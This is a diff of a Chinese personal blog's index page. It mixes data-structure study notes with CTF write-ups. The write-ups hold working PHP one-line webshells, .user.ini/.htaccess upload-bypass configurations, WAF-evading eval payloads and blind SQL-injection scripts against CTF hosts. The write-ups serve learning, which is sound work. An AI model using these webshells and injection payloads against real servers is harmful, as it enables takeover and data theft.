+<h3 id="有序表的查找"><a href="#有序表的查找" class="headerlink" title="有序表的查找"></a>有序表的查找</h3><p>折半查找：ASL=YASL+NASL=lb(n+1) + [lbn]</p>
+<p><strong>折半查找的时间复杂度：O（lbn）</strong></p>
+<blockquote>
+<p>不一定折半，可以通过计算D=（K-data[low]）/（data[high]-data[low]）</p>
+<p>来确定几分查找，其中K是查找的值</p>
+</blockquote>
+<h3 id="索引表的查找"><a href="#索引表的查找" class="headerlink" title="索引表的查找"></a>索引表的查找</h3><ol>
+<li>稠密索引</li>
+<li>分块索引：块内无序，块间有序</li>
+</ol>
+<p>最好的时间复杂度：O(  2^(1/2)  )，即块数和块内元素个数相等时</p>
+<h2 id="二叉排序树"><a href="#二叉排序树" class="headerlink" title="二叉排序树"></a>二叉排序树</h2><p>概念：左子树的值小于根的值，右子树的值大于根的值。</p>
+<h2 id="平衡二叉树【AVL树】"><a href="#平衡二叉树【AVL树】" class="headerlink" title="平衡二叉树【AVL树】"></a>平衡二叉树【AVL树】</h2><p>概念：首先是一个二叉排序树，其次每一个结点的<strong>（左子树高度-右子树高度）</strong>的值只能为-1,0,1这三个值。</p>
+<p><strong>查找、插入、删除时间复杂度：O(lbn)</strong></p>
+<h2 id="哈希查找"><a href="#哈希查找" class="headerlink" title="哈希查找"></a>哈希查找</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ol>
+<li>直接定址法</li>
+<li>数字分析法</li>
+<li>折叠法</li>
+<li>除留取余法</li>
+</ol>
+<h3 id="处理冲突的方法"><a href="#处理冲突的方法" class="headerlink" title="处理冲突的方法"></a>处理冲突的方法</h3><h4 id="开放定址法"><a href="#开放定址法" class="headerlink" title="开放定址法"></a>开放定址法</h4><ol>
+<li>线性探测</li>
+<li>二次探测</li>
+<li>随机探测</li>
+</ol>
+<h4 id="再哈希法"><a href="#再哈希法" class="headerlink" title="再哈希法"></a>再哈希法</h4><h4 id="链地址法"><a href="#链地址法" class="headerlink" title="链地址法"></a>链地址法</h4><h4 id="公共溢出法"><a href="#公共溢出法" class="headerlink" title="公共溢出法"></a>公共溢出法</h4><h3 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h3><p>装填因子α=填入表的记录个数/哈希表长度</p>
+<p>如果找到了好的装填因子，那么哈希查找的时间复杂度就是O(C)。</p>
+<h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><h3 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h3><h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><h2 id="交换排序"><a href="#交换排序" class="headerlink" title="交换排序"></a>交换排序</h2><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><h3 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h3><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><h2 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h2><h2 id="性能分析-1"><a href="#性能分析-1" class="headerlink" title="性能分析"></a>性能分析</h2><p><img src="/2020/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/1.jpg" alt="1"></p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/11/30/cve%E9%9B%86%E5%90%88/">cve集合</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-30</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/11/22/python%E5%AD%A6%E4%B9%A0/">python学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-22</time><div class="content"><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = [<span class="string">''</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">goal = <span class="string">'cba0c'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">			<span class="keyword">for</span> m <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">				<span class="keyword">for</span> n <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">					whole = dic[i]+dic[j]+dic[k]+dic[m]+dic[n]</span><br><span class="line">					res = hashlib.md5(whole.encode(encoding=<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line">					<span class="keyword">if</span>(res[<span class="number">0</span>:<span class="number">5</span>]==goal):</span><br><span class="line">						print(whole)</span><br></pre></td></tr></table></figure>
 
 </div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/09/26/sql-labs/">sql-labs刷题</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-09-26</time><div class="content"><h2 id="No-1【单引号字符型】"><a href="#No-1【单引号字符型】" class="headerlink" title="No.1【单引号字符型】"></a>No.1【单引号字符型】</h2><p>我们输入?id=2-1发现回显<strong>第二个</strong>数据</p>
 <p>我们输入?id=1’发现回显错误：</p>
@@ -894,546 +1809,6 @@
 <h2 id="例题-CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#例题-CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="例题:[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>例题:[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>写出python脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://df9ba400-06d5-4de6-bdd2-ee86a9a7a73e.node3.buuoj.cn/index.php'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">		payload = <span class="string">'0^(ascii(substr((select(flag)from(flag)),'</span> + str(i) + <span class="string">',1))&gt;'</span> + str(j) + <span class="string">')'</span></span><br><span class="line">		s = requests.post(url, data = &#123;<span class="string">'id'</span>:payload&#125;)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> s.text.find(<span class="string">'Error'</span>)&gt;<span class="number">0</span>:</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
 
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/08/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-08</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">web安全漏洞</a></span><div class="content"><p>首先，先是最简单的一句话木马的上传，即没有任何阻碍：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;ag&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果上传成功即可以用antsword去连接。</p>
-<blockquote>
-<p>有些时候POST请求可能会出问题，这时我们可以改为GET或者REQUEST</p>
-</blockquote>
-<h3 id="后缀验证"><a href="#后缀验证" class="headerlink" title="后缀验证"></a>后缀验证</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$extension = substr($name, strrpos($name, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span> (preg_match(<span class="string">"/ph|htacess/i"</span>, $extension)) &#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"illegal suffix!"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<p>有时后缀会过滤php，但我们可以使用phtml、php5等等的后缀，可是这里过滤掉了所有ph开头的后缀，同时过滤了.htacess文件。</p>
-<p>此时我们就只能改后缀为.jpg或者.png，来上传一句话木马。</p>
-<h3 id="lt-验证"><a href="#lt-验证" class="headerlink" title="&lt;?验证"></a>&lt;?验证</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里过滤掉了&lt;?字符，所以我们就需要使用一句话木马的变种：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;ag&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="exif-imagetype验证"><a href="#exif-imagetype验证" class="headerlink" title="exif_imagetype验证"></a>exif_imagetype验证</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$image_type = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"exif_imagetype:not image!"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个应该是验证一个文件头是否属于图片，我们可以伪造图片的文件头，一般我们使用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
-
-<p>整体一句话木马就变成了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;ag&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="user-ini（让-jpg文件被解析成-php）"><a href="#user-ini（让-jpg文件被解析成-php）" class="headerlink" title=".user.ini（让.jpg文件被解析成.php）"></a>.user.ini（让.jpg文件被解析成.php）</h3><blockquote>
-<p>那么什么是.user.ini？</p>
-<p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：</p>
-<p><img src="https://wooyun.js.org/images_result/images/2014103002272568560.png" alt="enter image description here"></p>
-<p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">这里</a>又解释了：</p>
-<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
-<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
-<p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
-<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p>
-<p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
-<p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p>
-<p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p>
-<p><img src="https://wooyun.js.org/images_result/images/2014103002272554789.png" alt="enter image description here"></p>
-<p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p>
-<p><img src="https://wooyun.js.org/images_result/images/2014103002272569525.png" alt="enter image description here"></p>
-<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。</p>
-</blockquote>
-<p>那么使用方法就很明显了，我们先上传一个.user.ini，里面写：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;a.jpg</span><br></pre></td></tr></table></figure>
-
-<p>然后再上传一个a.jpg，里面写着一句话木马，这样在所有该网站根目录下的网页，都会包含a.jpg的内容（也就是一句话木马）。</p>
-<blockquote>
-<p>例题：[SUCTF 2019]CheckIn</p>
-</blockquote>
-<h3 id="htaccess（让-jpg文件被解析成-php）"><a href="#htaccess（让-jpg文件被解析成-php）" class="headerlink" title=".htaccess（让.jpg文件被解析成.php）"></a>.htaccess（让.jpg文件被解析成.php）</h3><h6 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># FileMatch 参数即为文件名的正则匹配</span></span><br><span class="line">&lt;FilesMatch <span class="string">"sniperoj"</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sniperoj</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'ag'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h6 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filename.jpg</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'ag'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h6 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 自解析的 .htaccess</span><br><span class="line"><span class="tag">&lt;<span class="name">Files</span> "\<span class="attr">.htaccess</span>"&gt;</span></span><br><span class="line">    Allow from all</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "\<span class="attr">.htaccess</span>"&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line"># <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[ag]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"># 不过这种方式测试并没有成功... 暂时不清楚原因</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-<h2 id="一些思考"><a href="#一些思考" class="headerlink" title="一些思考"></a>一些思考</h2><h3 id="防止-htaccess和-user-ini方法"><a href="#防止-htaccess和-user-ini方法" class="headerlink" title="防止.htaccess和.user.ini方法"></a>防止.htaccess和.user.ini方法</h3><p>对所有的文件名进行加密或者哈希，这样这种拥有特殊名字的文件就会改变文件名（虽然后缀不变），也就不会再被解析，也就消除了漏洞。</p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">buuctf刷题记录</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-02</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/web%E5%88%B7%E9%A2%98/">web刷题</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/BUU/">BUU</a></span><div class="content"><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>查看源代码，发现存在waf（<em>Web Application Firewall</em>）：</p>
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/easycalc1.png" alt="easycalc1"></p>
-<p>找到calc.php，打开发现如下源代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>尝试构造payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26375&#x2F;calc.php? num&#x3D;a</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>为什么要在num前加一个空格？</p>
-<p>答：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
-<p>发现过滤怎么办？</p>
-<p>答：用chr()转ascii再进行拼接</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26375&#x2F;calc.php? num&#x3D;phpinfo()</span><br></pre></td></tr></table></figure>
-
-<p>发现可以正常运行，于是扫描根目录：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26375&#x2F;calc.php? num&#x3D;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
-
-<p>其中47转化为“/”，也就是扫描根目录，得到：</p>
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/easycalc2.png" alt="easycalc2"></p>
-<p>接着打开这个f1agg即可：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26375&#x2F;calc.php? num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure>
-
-<p>这些字符转化过来就是：/f1agg</p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;calc.php? num&#x3D;var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(47))))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/easycalc3.png" alt="easycalc3"></p>
-<p>这里其实是在利用当数字大于10时，其就会用字母表示，而36进制即可以表示出所有的字母</p>
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/easycalc4.png" alt="easycalc4"></p>
-<p>又发现dechex函数可以把10进制转换为16进制，而hex2bin将十六进制数转换为ASCII</p>
-<p>可以构造出readfile(/f1agg)来读取文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造为：base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))</span><br></pre></td></tr></table></figure>
-
-<p>当然也可以构造file_get_contents()，只不过可能比较麻烦，因为字母和下划线所用的函数不同，要叠加来叠加去</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;calc.php? num&#x3D;(base_convert(723938,10,36).hex2bin(dechex(95)).base_convert(21269,10,36).hex2bin(dechex(95)).base_convert(994052860192,10,36))</span><br><span class="line">(hex2bin(dechex(47)).base_convert(25254448,10,36))</span><br></pre></td></tr></table></figure>
-
-<p>解析出来就是file_get_contents(/f1agg)</p>
-<h1 id="强网杯-2019-随便注-amp-amp-GYCTF2020-Blacklist"><a href="#强网杯-2019-随便注-amp-amp-GYCTF2020-Blacklist" class="headerlink" title="[强网杯 2019]随便注  &amp;&amp;  [GYCTF2020]Blacklist"></a>[强网杯 2019]随便注  &amp;&amp;  [GYCTF2020]Blacklist</h1><p>这两道题比较像，就放在一起整理了。</p>
-<h2 id="强网杯"><a href="#强网杯" class="headerlink" title="强网杯"></a>强网杯</h2><p>先是最基本的发现注入点：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;--+</span><br></pre></td></tr></table></figure>
-
-<p>然后想用基本的联合注入，但是发现过滤了一系列东西：</p>
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/2-1.png" alt="2-1"></p>
-<p>于是就想到堆叠注入先读表名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show tables;--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/2-2.png" alt="2-2"></p>
-<p>然后试着读读列名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?inject&#x3D;1&#39;;show columns from &#96;1919810931114514&#96;;--+</span><br><span class="line">或者</span><br><span class="line">?inject&#x3D;1&#39;;desc &#96;1919810931114514&#96;;--+</span><br></pre></td></tr></table></figure>
-
-<p>分别读出两个表里的内容：</p>
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/2-3.png" alt="2-3"></p>
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/2-4.png" alt="2-4"></p>
-<p>现在我们的目标语句是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 1919810931114514</span><br></pre></td></tr></table></figure>
-
-<p>但是我们无法绕过select，于是就要想到别的办法</p>
-<h3 id="法一：预编译"><a href="#法一：预编译" class="headerlink" title="法一：预编译"></a>法一：<strong>预编译</strong></h3><p>首先给出预编译的一些基本语句：</p>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set用于设置变量名和值</span><br><span class="line">prepare用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">execute执行语句</span><br><span class="line">deallocate prepare用来释放掉预处理的语句</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>于是我们可以构造payload</p>
